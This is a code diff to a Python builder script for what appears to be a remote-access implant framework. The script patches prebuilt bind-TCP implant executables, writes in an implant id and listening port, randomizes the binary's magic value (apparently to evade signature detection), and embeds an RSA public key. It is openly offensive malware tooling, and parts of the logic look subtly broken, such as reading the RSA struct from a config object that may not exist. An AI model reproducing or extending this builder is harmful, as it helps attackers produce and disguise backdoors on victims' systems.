@@ -3,10 +3,14 @@ import os
 import datetime
 
 CONFIG_MAGIC = 0x99c72f6099c72f60
+RSA_MAGIC = 0x52534131
 WORKDIR = os.path.realpath(os.path.dirname(__file__)+"\\..")
 FILEDIR = os.path.join(WORKDIR, "files")
 STORAGEDIR = os.path.join(WORKDIR, "storage")
-    
+
+X64_ARCH = 0x8
+X32_ARCH = 0x4
+
 implant_types = {
     1: "Bind TCP x86 executable",
     2: "Bind TCP x64 executable",
@@ -24,6 +28,10 @@ CONFIG = {
     "id": eh.LONG
 }    
 
+RSA_KEY = {
+    "public_key": 283
+}    
+
 def main(args):
     if not os.path.exists(STORAGEDIR):
         os.makedirs(STORAGEDIR)
@@ -38,9 +46,9 @@ def main(args):
         eh.ui.Echo("Invalid option", eh.ECHO_ERROR)
     
     if type == 1:
-        patch("x86", os.path.join(FILEDIR, "X32_ClSp_Tcp_Exe.exe"))
+        patch(os.path.join(FILEDIR, "X32_ClSp_Tcp_Exe.exe"))
     elif type == 2:
-        patch("x64", os.path.join(FILEDIR, "X64_ClSp_Tcp_Exe.exe"))
+        patch(os.path.join(FILEDIR, "X64_ClSp_Tcp_Exe.exe"))
     elif type == 3:
         not_implemented()
     elif type == 4:
@@ -58,21 +66,30 @@ def not_implemented():
     eh.ui.Echo("Type not implemented yet", eh.ECHO_ERROR)
     return
     
-def patch(arch, name):
+def patch(name):
     
     while True:
         try:
-            id = eh.ui.Dialog("Enter the implant id")
+            id = int(eh.ui.Dialog("Enter the implant id"))
             break
         except ValueError:
             eh.ui.Echo("Invalid int input", eh.ECHO_ERROR)
     
     while True:
         try:
-            port = eh.ui.Dialog("Enter the implant listening port")
+            port = int(eh.ui.Dialog("Enter the implant listening port"))
             break
         except ValueError:
             eh.ui.Echo("Invalid int input", eh.ECHO_ERROR)
+        
+    while True:    
+        key_path = eh.ui.Dialog("Enter RSA2048 publickey path")
+        try:
+            with open(key_path, "rb") as f:
+                public_key = f.read()[::-1]
+                break
+        except IOError:
+            eh.ui.Echo("Error while opening the file", eh.ECHO_ERROR)
         
     try:
         with open(name, "rb") as f:
@@ -83,15 +100,21 @@ def patch(arch, name):
         return    
     
     magic_val = content.find(CONFIG_MAGIC.to_bytes(eh.LONGLONG, "little"))
-    print(magic_val)
+
     if magic_val > 0:
         config = eh.data.Struct(CONFIG)
         config.from_bytes(content, global_offset=magic_val)
-        print(port)
-        print(id)
-        config.port = int(port)
-        config.id = int(id)
         
+        config.magic_value = bytearray(os.urandom(eh.LONGLONG))
+        config.port = port
+        config.id = id
+        
+        
+    rsa_magic_val = content.find(RSA_MAGIC.to_bytes(eh.LONG, "big")) 
+    if rsa_magic_val > 0:
+        rsa_publickey = eh.data.Struct(RSA_KEY)
+        rsa_publickey.from_bytes(config.full_data(), global_offset=rsa_magic_val)
+        rsa_publickey.public_key = public_key
         try:
             dt = datetime.datetime.now()
             current_time = dt.strftime("%Y_%m_%d_%Hh%Mm%Ss")
